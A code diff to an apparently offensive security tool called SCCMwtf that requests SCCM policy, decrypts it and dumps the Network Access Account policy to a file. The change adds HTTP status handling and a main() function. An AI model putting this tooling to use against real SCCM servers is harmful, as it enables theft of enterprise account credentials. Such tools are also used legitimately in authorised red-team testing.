@@ -133,10 +133,15 @@ class SCCMTools:
         else:
           r = requests.request("CCM_POST", f"{self._serverURI}/ccm_system/request", headers=headers, data=data)
 
-        multipart_data = decoder.MultipartDecoder.from_response(r)
-        for part in multipart_data.parts:
-            if part.headers[b'content-type'] == b'application/octet-stream':
-                return zlib.decompress(part.content).decode('utf-16')
+        if r.status_code == 200:
+          multipart_data = decoder.MultipartDecoder.from_response(r)
+          for part in multipart_data.parts:
+              if part.headers[b'content-type'] == b'application/octet-stream':
+                  return zlib.decompress(part.content).decode('utf-16')
+        elif r.status_code == 403:
+          print(f"[!] Unauthorized!")
+        else:
+          print(f"[!] Unexpected Error code from SCCM Server: {r.status_code}")
 
     def requestPolicy(self, url, clientID="", authHeaders=False, retcontent=False):
         headers = {
@@ -242,7 +247,7 @@ class SCCMTools:
         policy = decrypted.decode('utf-16')
         return policy
 
-if __name__ == "__main__":
+def main():
     
     print("SCCMwtf... by @_xpn_")
 
@@ -284,3 +289,7 @@ if __name__ == "__main__":
           Tools.write_to_file(decryptedResult, "/tmp/naapolicy.xml")
 
     print("[*] Done.. decrypted policy dumped to /tmp/naapolicy.xml")
+
+
+if __name__ == "__main__":
+    main()
